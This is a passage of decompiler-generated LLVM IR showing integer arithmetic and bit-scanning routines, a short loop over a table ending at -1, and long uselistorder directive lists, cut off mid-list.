bb97:                                             ; preds = %bb96
  %v5_14a40 = udiv i32 %v1_14a54, 4
  %v6_14a40 = or i32 %v1_14a40, %v5_14a40
  br label %.thread10

.thread10:                                        ; preds = %bb96, %.thread9, %bb97
  %v1_14a48 = phi i32 [ %v6_14a3c, %bb96 ], [ %v1_14a3c, %.thread9 ], [ %v6_14a3c, %bb97 ]
  %v1_14a4c = phi i32 [ %v1_14a40, %bb96 ], [ %v1_14a40, %.thread9 ], [ %v6_14a40, %bb97 ]
  %v4_14a44 = udiv i32 %v1_14a58, 8
  %v6_14a44 = icmp ult i32 %v1_14a48, %v4_14a44
  br i1 %v6_14a44, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %.thread10
  %v3_14a48 = and i32 %v1_14a58, 4
  %v4_14a48 = icmp eq i32 %v3_14a48, 0
  %v6_14a48 = sub i32 %v1_14a48, %v4_14a44
  br i1 %v4_14a48, label %thread-pre-split12, label %bb99

bb99:                                             ; preds = %bb98
  %v5_14a4c = udiv i32 %v1_14a54, 8
  %v6_14a4c = or i32 %v1_14a4c, %v5_14a4c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb99, %.thread10, %bb98
  %v1_14a64 = phi i32 [ %v1_14a4c, %bb98 ], [ %v1_14a4c, %.thread10 ], [ %v6_14a4c, %bb99 ]
  %v0_14a50 = phi i32 [ %v6_14a48, %bb98 ], [ %v1_14a48, %.thread10 ], [ %v6_14a48, %bb99 ]
  %v2_14a50 = icmp eq i32 %v0_14a50, 0
  br i1 %v2_14a50, label %dec_label_pc_14a60, label %bb100

bb100:                                            ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_14a54, 16
  br i1 %tmp, label %dec_label_pc_14a60, label %.thread13

.thread13:                                        ; preds = %bb100
  %v4_14a54 = udiv i32 %v1_14a54, 16
  %v4_14a58 = udiv i32 %v1_14a58, 16
  br label %dec_label_pc_14a20

dec_label_pc_14a60:                               ; preds = %thread-pre-split12, %bb100
  %v1_14a60 = icmp slt i32 %v2_149b8, 0
  br i1 %v1_14a60, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_14a60
  %v2_14a64 = sub i32 0, %v1_14a64
  br label %.thread16

.thread16:                                        ; preds = %bb105, %bb104, %bb102, %dec_label_pc_14a6c, %dec_label_pc_14a60, %bb101
  %v1_14a68 = phi i32 [ %v1_14a64, %dec_label_pc_14a60 ], [ %v2_14a64, %bb101 ], [ %v2_14a70, %bb102 ], [ undef, %dec_label_pc_14a6c ], [ %v1_14a8480, %bb104 ], [ %v2_14a80, %bb105 ]
  ret i32 %v1_14a68

dec_label_pc_14a6c:                               ; preds = %thread-pre-split
  br i1 %v1_149b4, label %bb102, label %.thread16

bb102:                                            ; preds = %dec_label_pc_14a6c
  %v2_14a70 = sub i32 0, %v0_149b8
  br label %.thread16

dec_label_pc_14a78:                               ; preds = %bb87
  br i1 %v3_149d4, label %bb104, label %bb103

bb103:                                            ; preds = %dec_label_pc_14a78
  br label %bb104

bb104:                                            ; preds = %dec_label_pc_14a78, %bb103
  %v1_14a8480 = phi i32 [ %v0_149b8, %dec_label_pc_14a78 ], [ 0, %bb103 ]
  br i1 %v9_149d4, label %bb105, label %.thread16

bb105:                                            ; preds = %bb104
  %v4_14a7c = ashr i32 %v2_149b8, 31
  %v2_14a80 = or i32 %v4_14a7c, 1
  br label %.thread16

dec_label_pc_14a88:                               ; preds = %dec_label_pc_149dc
  %v2_14a88 = icmp ugt i32 %v1_14a8c, 65535
  br i1 %v2_14a88, label %bb106, label %.thread19

bb106:                                            ; preds = %dec_label_pc_14a88
  %v2_14a8c = and i32 %v1_14a8c, 32768
  %v3_14a8c = icmp eq i32 %v2_14a8c, 0
  %v4_14a8c = udiv i32 %v1_14a8c, 65536
  br i1 %v3_14a8c, label %.thread19, label %bb107

.thread19:                                        ; preds = %bb106, %dec_label_pc_14a88
  %v0_14a9870 = phi i32 [ %v1_14a8c, %dec_label_pc_14a88 ], [ %v4_14a8c, %bb106 ]
  br label %bb107

bb107:                                            ; preds = %bb106, %.thread19
  %v1_14a9c = phi i32 [ %v0_14a9870, %.thread19 ], [ %v4_14a8c, %bb106 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb106 ]
  %v2_14a98 = icmp ugt i32 %v1_14a9c, 255
  br i1 %v2_14a98, label %bb108, label %.thread20

bb108:                                            ; preds = %bb107
  %v2_14a9c = and i32 %v1_14a9c, 128
  %v3_14a9c = icmp eq i32 %v2_14a9c, 0
  %v4_14a9c = udiv i32 %v1_14a9c, 256
  br i1 %v3_14a9c, label %.thread20, label %bb109

bb109:                                            ; preds = %bb108
  %v2_14aa0 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb108, %bb107, %bb109
  %v1_14aac = phi i32 [ %storemerge, %bb107 ], [ %storemerge, %bb108 ], [ %v2_14aa0, %bb109 ]
  %v1_14aa8 = phi i32 [ %v1_14a9c, %bb107 ], [ %v4_14a9c, %bb108 ], [ %v4_14a9c, %bb109 ]
  %v2_14aa4 = icmp ugt i32 %v1_14aa8, 15
  br i1 %v2_14aa4, label %bb110, label %.thread21

bb110:                                            ; preds = %.thread20
  %v2_14aa8 = and i32 %v1_14aa8, 8
  %v3_14aa8 = icmp eq i32 %v2_14aa8, 0
  %v4_14aa8 = udiv i32 %v1_14aa8, 16
  br i1 %v3_14aa8, label %.thread21, label %bb111

bb111:                                            ; preds = %bb110
  %v2_14aac = add nsw i32 %v1_14aac, 4
  br label %.thread21

.thread21:                                        ; preds = %bb110, %.thread20, %bb111
  %v4_14ab4 = phi i32 [ %v1_14aac, %.thread20 ], [ %v1_14aac, %bb110 ], [ %v2_14aac, %bb111 ]
  %v5_14ab8 = phi i32 [ %v1_14aa8, %.thread20 ], [ %v4_14aa8, %bb110 ], [ %v4_14aa8, %bb111 ]
  %v2_14ab0 = icmp ugt i32 %v5_14ab8, 3
  %v7_14ab0 = icmp eq i32 %v5_14ab8, 4
  %v2_14ab4 = xor i1 %v7_14ab0, true
  %v3_14ab4 = and i1 %v2_14ab0, %v2_14ab4
  br i1 %v3_14ab4, label %bb112, label %bb113

bb112:                                            ; preds = %.thread21
  %v5_14ab4 = add nsw i32 %v4_14ab4, 3
  br label %bb113

bb113:                                            ; preds = %.thread21, %bb112
  %v4_14ab8 = phi i32 [ %v4_14ab4, %.thread21 ], [ %v5_14ab4, %bb112 ]
  %v2_14ab8 = xor i1 %v2_14ab0, true
  %v3_14ab8 = or i1 %v7_14ab0, %v2_14ab8
  br i1 %v3_14ab8, label %bb114, label %bb115

bb114:                                            ; preds = %bb113
  %v8_14ab8 = udiv i32 %v5_14ab8, 2
  %v9_14ab8 = add i32 %v4_14ab8, %v8_14ab8
  br label %bb115

bb115:                                            ; preds = %bb113, %bb114
  %v1_14ac0 = phi i32 [ %v4_14ab8, %bb113 ], [ %v9_14ab8, %bb114 ]
  %v1_14abc = icmp slt i32 %v2_149b8, 0
  %v6_14ac0 = lshr i32 %v0_14ac0, %v1_14ac0
  %v2_14ac4 = sub i32 0, %v6_14ac0
  %v2_14ac4.v6_14ac0 = select i1 %v1_14abc, i32 %v2_14ac4, i32 %v6_14ac0
  ret i32 %v2_14ac4.v6_14ac0

dec_label_pc_14acc:                               ; preds = %dec_label_pc_149b4
  %v0_14acc = load i32, i32* @lr, align 4
  %v0_14ad0 = call i32 @function_ca14()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_14acc)
  %v9_14adc = load i32, i32* @lr, align 4
  %v0_14ae0 = call i32 @function_149b4()
  store i32 %v9_14adc, i32* @lr, align 4
  ret i32 %v0_14ae0

; uselistorder directives
  uselistorder i32 %v4_14ab8, { 1, 0 }
  uselistorder i1 %v7_14ab0, { 1, 0 }
  uselistorder i32 %v4_14aa8, { 1, 0 }
  uselistorder i32 %v1_14aa8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14a9c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14a9c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14a8c, { 1, 0 }
  uselistorder i32 %v0_14a50, { 1, 0 }
  uselistorder i32 %v4_14a44, { 1, 0 }
  uselistorder i32 %v1_14a4c, { 1, 2, 0 }
  uselistorder i32 %v4_14a38, { 1, 0 }
  uselistorder i32 %v1_14a40, { 1, 2, 0 }
  uselistorder i32 %v4_14a2c, { 1, 0 }
  uselistorder i32 %v1_14a34, { 1, 2, 0 }
  uselistorder i32 %v1_14a58, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14a28, { 1, 0 }
  uselistorder i32 %v1_14a54, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14a14, { 1, 0 }
  uselistorder i32 %v3_14a10, { 1, 0 }
  uselistorder i32 %v1_14a10, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_14a0c, { 1, 0 }
  uselistorder i32 %v1_14a14, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14a00, { 1, 0 }
  uselistorder i32 %v4_149fc, { 2, 1, 0 }
  uselistorder i32 %v1_14a00, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14a08.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_149d4, { 1, 0 }
  uselistorder i32 %v1_14a8c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_149b8, { 1, 0, 2 }
  uselistorder i32 %v0_149b8, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_149b4, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_149b4, { 1, 0, 2 }
  uselistorder i32 ()* @function_ca14, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 11, 12, 26, 13, 14, 27, 28, 29, 30, 31, 34, 35, 36, 4, 37, 38, 39, 40, 17, 18, 19, 41, 42, 43, 44, 45, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 0, 62, 63, 1, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 5, 121, 122, 123, 6, 124, 125, 126, 7, 127, 128, 129, 130, 131, 132, 133, 134, 47, 64, 66, 67, 68, 69, 21, 22, 70, 8, 72, 73, 71, 135, 24, 109, 136, 137, 74, 75, 76, 138, 46, 32, 33, 80, 81, 77, 78, 79, 82, 83, 84, 86, 87, 88, 48, 49, 89, 90, 91, 92, 93, 94, 95, 10, 9, 2, 96, 97, 98, 99, 3, 100, 85, 15, 16, 101, 23, 65, 110, 20, 25, 102, 103, 104, 105, 106, 107, 108 }
  uselistorder i32 3, { 56, 49, 57, 50, 14, 26, 27, 58, 22, 59, 60, 23, 61, 62, 15, 63, 0, 29, 28, 38, 3, 2, 1, 4, 64, 30, 5, 6, 16, 7, 8, 39, 40, 71, 41, 42, 43, 44, 45, 46, 65, 12, 31, 66, 32, 9, 13, 51, 72, 21, 67, 68, 17, 69, 18, 19, 11, 20, 70, 10, 47, 24, 48, 25, 33, 34, 35, 52, 53, 54, 36, 55, 37 }
  uselistorder i32 15, { 3, 4, 1, 5, 2, 0 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 130, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 131, 67, 132, 68, 133, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 125, 1, 81, 84, 83, 82, 87, 86, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 134, 97, 98, 99, 124, 104, 100, 101, 105, 102, 103, 106, 107, 112, 108, 109, 111, 110, 113, 115, 114, 126, 116, 117, 118, 119, 120, 121, 122, 127, 129, 123, 128 }
  uselistorder i32 128, { 13, 12, 6, 7, 9, 5, 15, 0, 21, 22, 1, 8, 10, 16, 17, 18, 2, 3, 11, 19, 20, 4, 14 }
  uselistorder i32 255, { 7, 8, 11, 3, 9, 0, 1, 12, 4, 5, 6, 10, 2 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 15, 11, 16, 12, 17, 13, 18, 14, 19, 20, 21, 25, 22, 26, 23, 27, 24, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 50 }
  uselistorder i32 32768, { 3, 2, 1, 0, 4 }
  uselistorder i32 65535, { 3, 4, 1, 0, 2 }
  uselistorder i32 31, { 10, 11, 9, 3, 12, 2, 1, 0, 4, 6, 5, 7, 13, 14, 8 }
  uselistorder i32 4, { 164, 165, 129, 7, 8, 166, 167, 128, 9, 10, 168, 11, 88, 89, 90, 169, 170, 171, 172, 173, 174, 175, 0, 12, 56, 176, 177, 178, 179, 180, 181, 182, 55, 183, 91, 92, 93, 184, 185, 80, 186, 69, 187, 13, 14, 1, 135, 188, 189, 190, 191, 192, 193, 194, 195, 94, 95, 96, 81, 97, 98, 99, 100, 101, 102, 196, 103, 104, 199, 200, 82, 105, 15, 201, 16, 79, 70, 71, 17, 274, 72, 58, 18, 19, 73, 74, 275, 276, 277, 278, 75, 279, 280, 281, 282, 76, 283, 284, 285, 286, 287, 20, 288, 289, 290, 291, 292, 77, 57, 293, 294, 295, 296, 297, 298, 21, 22, 78, 197, 198, 83, 202, 203, 204, 205, 84, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 299, 300, 301, 303, 304, 106, 107, 108, 138, 139, 140, 141, 23, 132, 109, 133, 110, 62, 134, 148, 111, 149, 150, 2, 270, 271, 272, 273, 63, 112, 113, 220, 222, 221, 218, 219, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 3, 24, 238, 156, 302, 239, 25, 26, 27, 28, 4, 29, 59, 60, 30, 5, 66, 6, 31, 114, 51, 32, 33, 240, 142, 115, 34, 116, 117, 118, 119, 120, 241, 35, 242, 121, 243, 244, 245, 246, 247, 248, 249, 122, 250, 251, 252, 253, 254, 255, 52, 258, 123, 124, 257, 130, 256, 259, 260, 85, 261, 262, 143, 144, 145, 61, 64, 146, 147, 263, 264, 36, 37, 67, 38, 39, 68, 65, 40, 41, 136, 42, 43, 44, 45, 46, 125, 47, 126, 151, 152, 53, 153, 154, 155, 157, 158, 159, 160, 161, 162, 163, 265, 86, 266, 267, 268, 127, 48, 137, 54, 49, 269, 50, 131, 87 }
  uselistorder i32 2, { 1, 113, 2, 3, 4, 5, 6, 7, 112, 8, 9, 10, 11, 12, 44, 45, 13, 125, 64, 65, 127, 104, 105, 126, 66, 128, 129, 130, 131, 132, 42, 80, 115, 14, 116, 117, 133, 134, 135, 15, 46, 47, 48, 49, 50, 51, 136, 137, 106, 107, 108, 76, 16, 109, 52, 158, 159, 69, 160, 161, 55, 162, 54, 163, 53, 138, 139, 41, 140, 141, 17, 142, 143, 0, 81, 82, 119, 83, 120, 84, 121, 18, 110, 67, 118, 19, 164, 68, 144, 20, 85, 145, 146, 21, 86, 147, 148, 77, 124, 22, 56, 114, 23, 24, 57, 58, 59, 71, 60, 72, 61, 62, 63, 43, 149, 150, 151, 152, 78, 25, 26, 27, 111, 28, 79, 153, 73, 70, 29, 154, 155, 156, 157, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 87, 88, 89, 90, 91, 92, 93, 94, 74, 95, 122, 75, 96, 97, 98, 99, 123, 40, 100, 101, 102, 103 }
  uselistorder i32 16, { 3, 23, 4, 5, 1, 6, 7, 8, 24, 9, 10, 2, 11, 12, 57, 58, 59, 0, 60, 61, 13, 14, 62, 63, 15, 64, 65, 66, 67, 68, 69, 75, 76, 31, 32, 33, 110, 34, 111, 112, 35, 113, 114, 36, 115, 116, 117, 118, 119, 120, 70, 71, 72, 77, 78, 37, 79, 80, 81, 82, 83, 84, 85, 86, 87, 38, 88, 48, 52, 89, 90, 28, 46, 16, 55, 56, 26, 121, 27, 91, 92, 93, 94, 95, 73, 74, 98, 99, 100, 101, 102, 103, 104, 105, 106, 47, 96, 97, 49, 17, 107, 25, 18, 19, 20, 21, 22, 42, 50, 51, 39, 40, 41, 53, 54, 29, 108, 43, 109, 30, 44, 45 }
  uselistorder i32 268435455, { 2, 3, 4, 0, 5, 1 }
  uselistorder i32 8, { 47, 25, 3, 4, 15, 5, 46, 26, 6, 7, 16, 8, 62, 63, 64, 65, 0, 1, 66, 67, 68, 69, 70, 9, 71, 50, 39, 40, 48, 72, 73, 74, 75, 21, 76, 77, 79, 136, 31, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 32, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 23, 89, 49, 90, 91, 92, 93, 94, 95, 153, 51, 10, 55, 135, 99, 98, 96, 97, 100, 101, 102, 103, 104, 105, 11, 106, 107, 2, 60, 61, 27, 152, 35, 36, 33, 34, 17, 18, 29, 30, 37, 154, 108, 109, 110, 111, 114, 115, 45, 116, 117, 118, 119, 22, 120, 41, 42, 121, 122, 123, 38, 124, 125, 126, 127, 28, 19, 20, 128, 129, 43, 112, 113, 52, 130, 131, 24, 132, 133, 53, 54, 12, 13, 44, 14, 56, 57, 58, 59, 134 }
  uselistorder i1 true, { 0, 1, 2, 3, 4, 44, 47, 5, 6, 8, 7, 9, 50, 48, 10, 11, 12, 13, 14, 15, 49, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 42, 29, 30, 27, 28, 51, 52, 53, 54, 31, 32, 43, 55, 56, 33, 34, 35, 45, 36, 37, 38, 39, 46, 40, 41 }
  uselistorder i32* @r1, { 44, 45, 46, 47, 1, 48, 49, 19, 50, 53, 51, 52, 17, 10, 25, 23, 24, 26, 54, 55, 56, 57, 58, 59, 60, 61, 3, 4, 62, 63, 64, 65, 66, 67, 68, 71, 72, 73, 74, 75, 76, 77, 5, 28, 29, 14, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 7, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 6, 179, 180, 12, 69, 70, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 18, 20, 21, 22, 181, 2, 182, 37, 42, 40, 94, 99, 100, 103, 101, 102, 95, 96, 97, 98, 104, 110, 183, 184, 185, 111, 112, 113, 11, 114, 105, 106, 107, 108, 109, 8, 115, 116, 117, 9, 13, 118, 119, 120, 121, 122, 0, 123, 124, 125, 16, 27, 126, 38, 127, 39, 128, 15, 30, 31, 32, 33, 36, 41, 43, 129, 130, 131, 132, 34, 35 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_14a60, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_14a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a08thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_14af4(i32 %arg1) local_unnamed_addr {
dec_label_pc_14af4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14af8 = load i32, i32* @global_var_1f078.488, align 4
  %v7_14afc = icmp eq i32 %v3_14af8, -1
  %v3_14b00 = load i32, i32* @r4, align 4
  store i32 %v3_14b00, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1f078.488 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_14afc, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_14af4
  store i32 %v3_14b00, i32* %r4.global-to-local, align 4
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_14af4, %.preheader
  %v0_14b10 = phi i32 [ %v3_14b14, %.preheader ], [ %v3_14af8, %dec_label_pc_14af4 ]
  call void @__pseudo_branch(i32 %v0_14b10)
  %v0_14b14 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b14 = add i32 %v0_14b14, -4
  %v2_14b14 = inttoptr i32 %v1_14b14 to i32*
  %v3_14b14 = load i32, i32* %v2_14b14, align 4
  store i32 %v1_14b14, i32* %r4.global-to-local, align 4
  %v3_14b18 = icmp eq i32 %v3_14b14, -1
  br i1 %v3_14b18, label %dec_label_pc_14b20, label %.preheader

dec_label_pc_14b20:                               ; preds = %.preheader
  %v2_14b20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b20, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v3_14b14, { 1, 0 }
  uselistorder i32 %v3_14af8, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 52, 21, 22, 43, 23, 24, 53, 54, 55, 6, 25, 26, 27, 56, 57, 58, 7, 28, 29, 30, 59, 60, 61, 8, 31, 32, 62, 20, 19, 63, 64, 65, 18, 17, 16, 15, 33, 34, 35, 36, 37, 3, 38, 4, 39, 5, 66, 14, 40, 10, 44, 1, 45, 46, 47, 41, 48, 11, 9, 49, 50, 51, 13, 12, 42, 0, 2 }
  uselistorder i32 -1, { 152, 0, 153, 154, 1, 42, 43, 2, 236, 155, 32, 33, 66, 237, 238, 67, 239, 132, 3, 240, 68, 4, 5, 69, 214, 6, 7, 8, 75, 73, 70, 215, 119, 120, 74, 72, 71, 133, 216, 241, 156, 157, 63, 34, 9, 76, 242, 158, 159, 243, 244, 77, 245, 10, 78, 35, 36, 160, 161, 162, 79, 246, 163, 49, 80, 12, 13, 135, 44, 45, 134, 249, 51, 50, 46, 47, 164, 121, 122, 165, 166, 11, 250, 251, 167, 64, 37, 168, 252, 14, 38, 169, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 170, 247, 248, 171, 56, 253, 172, 173, 254, 255, 65, 57, 58, 256, 257, 258, 259, 260, 59, 136, 261, 128, 151, 137, 262, 263, 264, 174, 138, 265, 15, 266, 175, 16, 176, 267, 268, 139, 81, 224, 82, 309, 310, 83, 269, 84, 225, 85, 311, 86, 229, 87, 312, 88, 313, 89, 314, 90, 315, 91, 226, 92, 227, 93, 316, 94, 317, 60, 318, 17, 177, 18, 95, 230, 231, 178, 179, 180, 232, 233, 140, 19, 217, 55, 181, 182, 141, 183, 20, 21, 53, 96, 270, 97, 219, 98, 234, 99, 271, 100, 220, 101, 272, 102, 221, 103, 222, 142, 273, 104, 274, 184, 105, 106, 275, 150, 107, 185, 186, 187, 188, 189, 190, 191, 192, 149, 276, 108, 277, 193, 278, 194, 22, 52, 61, 62, 279, 195, 280, 196, 143, 281, 39, 282, 283, 144, 23, 197, 198, 123, 129, 127, 284, 24, 130, 27, 25, 26, 131, 145, 285, 286, 199, 28, 40, 48, 124, 41, 228, 287, 146, 109, 288, 110, 289, 111, 235, 112, 223, 113, 292, 114, 319, 115, 218, 116, 293, 117, 290, 118, 291, 200, 201, 202, 203, 204, 205, 147, 206, 207, 208, 209, 210, 211, 212, 29, 30, 31, 125, 126, 54, 213, 148 }
  uselistorder i32* @global_var_1f078.488, { 1, 0 }
  uselistorder i32 1, { 510, 261, 863, 345, 864, 346, 865, 866, 867, 868, 869, 870, 871, 872, 511, 306, 307, 305, 302, 301, 303, 304, 873, 437, 874, 875, 512, 119, 118, 120, 117, 123, 121, 122, 368, 876, 877, 513, 188, 288, 878, 380, 879, 884, 885, 421, 886, 887, 888, 438, 439, 889, 890, 514, 295, 300, 298, 299, 296, 297, 515, 891, 516, 285, 284, 283, 286, 892, 517, 176, 177, 893, 894, 895, 896, 518, 225, 226, 768, 769, 770, 771, 772, 773, 774, 775, 776, 521, 520, 519, 205, 206, 207, 777, 778, 779, 780, 781, 525, 524, 523, 522, 209, 208, 214, 210, 218, 211, 213, 215, 217, 216, 212, 381, 897, 898, 382, 899, 900, 901, 902, 903, 440, 904, 905, 906, 907, 908, 527, 526, 199, 197, 201, 198, 202, 203, 204, 196, 200, 361, 913, 909, 910, 911, 912, 406, 528, 154, 153, 155, 792, 793, 794, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 529, 168, 169, 162, 163, 164, 165, 167, 166, 369, 930, 929, 84, 931, 932, 933, 934, 935, 936, 530, 338, 339, 340, 337, 531, 224, 370, 441, 937, 532, 235, 233, 232, 236, 234, 938, 939, 442, 533, 181, 182, 179, 183, 178, 180, 940, 941, 535, 534, 331, 332, 334, 333, 335, 536, 144, 537, 443, 444, 538, 85, 943, 383, 942, 371, 351, 946, 384, 944, 0, 947, 948, 949, 950, 541, 540, 539, 281, 282, 961, 962, 963, 964, 965, 422, 966, 967, 423, 969, 445, 970, 416, 417, 426, 1, 424, 425, 971, 968, 446, 972, 412, 548, 547, 497, 546, 545, 498, 544, 543, 542, 362, 409, 973, 974, 975, 976, 977, 385, 549, 55, 795, 796, 797, 550, 313, 314, 312, 311, 978, 372, 979, 1123, 373, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 499, 552, 551, 94, 95, 87, 92, 88, 93, 86, 89, 91, 90, 447, 951, 952, 953, 954, 955, 956, 553, 500, 59, 58, 60, 374, 386, 980, 448, 981, 984, 449, 359, 387, 356, 418, 419, 985, 450, 986, 987, 988, 989, 388, 990, 347, 991, 992, 451, 993, 994, 566, 565, 564, 563, 562, 561, 560, 559, 558, 557, 556, 555, 554, 501, 33, 27, 30, 32, 26, 25, 22, 37, 29, 28, 24, 23, 31, 36, 34, 35, 995, 996, 502, 567, 131, 129, 134, 136, 132, 133, 128, 130, 135, 997, 998, 999, 1000, 357, 1001, 1002, 1003, 568, 229, 230, 227, 231, 228, 1004, 1005, 569, 257, 1006, 1007, 1008, 1009, 1010, 66, 65, 63, 64, 62, 61, 67, 68, 570, 287, 1011, 572, 571, 50, 51, 52, 389, 427, 575, 574, 573, 576, 328, 577, 53, 54, 578, 246, 247, 579, 195, 175, 580, 251, 581, 317, 582, 248, 583, 318, 584, 326, 585, 341, 586, 194, 587, 223, 327, 222, 2, 591, 590, 589, 588, 289, 290, 452, 592, 390, 453, 593, 189, 594, 838, 599, 598, 597, 596, 595, 238, 239, 241, 242, 240, 827, 828, 602, 601, 600, 192, 193, 603, 363, 845, 358, 846, 391, 604, 265, 270, 264, 267, 266, 269, 271, 268, 364, 782, 605, 170, 172, 173, 171, 174, 839, 392, 840, 393, 841, 607, 606, 113, 114, 112, 115, 116, 608, 104, 100, 106, 102, 101, 103, 105, 609, 611, 610, 1136, 394, 614, 613, 612, 310, 309, 615, 81, 82, 80, 83, 616, 279, 280, 278, 277, 617, 256, 255, 395, 1012, 618, 249, 250, 619, 191, 620, 243, 621, 57, 622, 56, 623, 245, 624, 17, 625, 16, 626, 15, 454, 1013, 360, 1014, 1015, 455, 1034, 630, 629, 628, 627, 11, 13, 14, 12, 631, 632, 850, 851, 3, 852, 396, 853, 10, 634, 633, 319, 320, 1137, 635, 945, 636, 880, 881, 882, 883, 1035, 1036, 637, 308, 375, 1037, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 274, 272, 273, 275, 276, 1038, 1039, 4, 1040, 5, 6, 7, 397, 1041, 1042, 8, 139, 140, 1043, 352, 263, 262, 1044, 1045, 783, 784, 785, 786, 787, 788, 789, 1141, 20, 21, 18, 19, 1046, 138, 137, 456, 638, 457, 1047, 1048, 1049, 1050, 639, 503, 148, 149, 145, 146, 147, 960, 957, 958, 959, 353, 376, 108, 111, 107, 109, 110, 1051, 1052, 1053, 1054, 1055, 1056, 640, 77, 74, 79, 76, 75, 78, 398, 1057, 1058, 458, 1059, 642, 641, 219, 220, 221, 1060, 1061, 644, 643, 71, 72, 73, 646, 645, 254, 253, 829, 648, 647, 70, 69, 413, 1062, 460, 1063, 1064, 399, 400, 1065, 1066, 461, 1067, 1069, 1070, 1071, 462, 1073, 401, 1074, 1072, 459, 1075, 463, 1076, 414, 1077, 1078, 1068, 652, 651, 650, 649, 38, 44, 41, 45, 40, 39, 46, 47, 42, 43, 1079, 653, 321, 325, 322, 324, 323, 654, 152, 151, 1080, 1081, 1082, 655, 48, 49, 415, 365, 1084, 366, 1085, 402, 1086, 1087, 1089, 354, 1090, 464, 1091, 367, 1088, 405, 663, 662, 661, 660, 659, 658, 657, 656, 124, 125, 127, 126, 465, 377, 664, 185, 186, 187, 1083, 428, 504, 665, 315, 466, 790, 791, 666, 293, 292, 294, 1138, 429, 1139, 1140, 667, 330, 329, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 467, 1101, 1102, 1103, 1104, 378, 1105, 670, 669, 668, 159, 158, 157, 161, 160, 468, 410, 411, 830, 673, 672, 671, 96, 98, 97, 99, 675, 674, 190, 677, 676, 678, 1106, 1107, 1108, 1109, 1110, 681, 